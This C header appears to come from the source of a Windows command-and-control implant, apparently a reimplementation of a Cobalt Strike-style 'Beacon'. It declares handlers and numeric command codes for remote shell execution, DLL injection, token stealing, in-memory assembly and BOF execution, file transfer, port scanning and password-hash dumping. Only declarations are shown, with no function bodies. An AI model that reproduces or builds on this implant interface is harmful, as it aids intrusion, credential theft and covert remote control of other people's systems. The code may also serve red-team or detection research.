#pragma once
#include <corecrt_io.h>
#include <wchar.h>
#include <locale.h>
#include <string.h>
#include <time.h>
#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <limits.h>
#include <stdint.h>
#include "Config.h"
#include "Util.h"
#include "Api.h"
#include "CallbackType.h"

// Beacon command handlers
VOID CmdChangSleepTimes(unsigned char* command, size_t command_length);
VOID CmdPs(unsigned char* command, size_t command_length);
VOID CmdInlineExecute(unsigned char* command, size_t command_length);
unsigned char* CmdFileBrowse(unsigned char* command, size_t command_length, size_t* msgLen);
unsigned char* CmdUpload(unsigned char* command, size_t command_length, size_t* msgLen, unsigned char* mode);
unsigned char* CmdDrives(unsigned char* command, size_t command_length, size_t* msgLen);
unsigned char* CmdMkdir(unsigned char* command, size_t command_length, size_t* msgLen);
unsigned char* CmdFileRemove(unsigned char* command, size_t command_length, size_t* msgLen);
unsigned char* CmdFileCopy(unsigned char* command, size_t commandlen, size_t* msgLen);
unsigned char* CmdFileMove(unsigned char* command, size_t command_length, size_t* msgLen);
unsigned char* CmdSetEnv(unsigned char* command, size_t command_length, size_t* msgLen);
VOID CmdFileDownload(unsigned char* command, size_t command_length, size_t* msgLen);
VOID CmdShell(unsigned char* command, size_t command_length);
VOID CmdDllInject(unsigned char* command, size_t command_length, BOOL x86);
VOID CmdExecuteAssembly(unsigned char* command, size_t command_length);
unsigned char* CmdPwd(size_t* msgLen);
unsigned char* CmdGetUid(size_t* msgLen);
unsigned char* CmdCd(unsigned char* command, size_t command_length, size_t* msgLen);
unsigned char* CmdGetPrivs(size_t* msgLength);
unsigned char* CmdJobList(size_t* msgLen);
unsigned char* CmdJobKill(unsigned char* command, size_t command_length, size_t* msgLength);
VOID CmdSpawn(unsigned char* command, size_t command_length, BOOL x86, BOOL ignoreToken);
VOID CmdJobRegister(unsigned char* command, size_t command_length, BOOL impersonate, BOOL isMsgMode);

// Utility functions
wchar_t* makeMetaData();
unsigned char* MakePacket(int callback, unsigned char* postMsg, size_t msgLen, size_t* buflen);
VOID DataProcess(unsigned char* postMsg, size_t msgLen, int callbackType);

// command_type
#define CMD_TYPE_SPAWN_X86                   1
#define CMD_TYPE_EXIT                        3
#define CMD_TYPE_SLEEP                       4
#define CMD_TYPE_CD                          5
#define CMD_TYPE_INJECT_X86                  9
#define CMD_TYPE_UPLOAD_START                10
#define CMD_TYPE_DOWNLOAD                    11
#define CMD_TYPE_EXECUTE                     12
#define CMD_TYPE_GETUID                      27
#define CMD_TYPE_STEAL_TOKEN                 31
#define CMD_TYPE_PS                          32
#define CMD_TYPE_KILL                        33
#define CMD_TYPE_IMPORT_POWERSHELL           37
#define CMD_TYPE_PWD                         39
#define CMD_TYPE_PIPE                        40
#define CMD_TYPE_JOBS                        41
#define CMD_TYPE_JOBS_KILL                   42
#define CMD_TYPE_INJECT_X64                  43
#define CMD_TYPE_SPAWN_X64                   44
#define CMD_TYPE_PAUSE                       47
#define CMD_TYPE_MAKE_TOKEN                  49
#define CMD_TYPE_FILE_BROWSE                 53
#define CMD_TYPE_MKDIR                       54
#define CMD_TYPE_DRIVES                      55
#define CMD_TYPE_RM                          56
#define CMD_TYPE_UPLOAD_LOOP                 67
#define CMD_TYPE_EXECUTE_ASSEMBLY_TOKEN_X86  70
#define CMD_TYPE_EXECUTE_ASSEMBLY_TOKEN_X64  71
#define CMD_TYPE_SETENV                      72
#define CMD_TYPE_CP                          73
#define CMD_TYPE_MV                          74
#define CMD_TYPE_RUNU                        76
#define CMD_TYPE_GET_PRIVS                   77
#define CMD_TYPE_SHELL                       78
#define CMD_TYPE_POWERSHELL_PORT             79
#define CMD_TYPE_ARGUE_ADD                   83
#define CMD_TYPE_ARGUE_REMOVE                84
#define CMD_TYPE_ARGUE_QUERY                 85
#define CMD_TYPE_EXECUTE_ASSEMBLY_X86        87
#define CMD_TYPE_EXECUTE_ASSEMBLY_X64        88
#define CMD_TYPE_PORTSCAN_X86                89
#define CMD_TYPE_PORTSCAN_X64                90
#define CMD_TYPE_BOF                         100
#define CMD_TYPE_JOB_REGISTER_MSGMODE        101
#define CMD_TYPE_DUMPHASH                    103
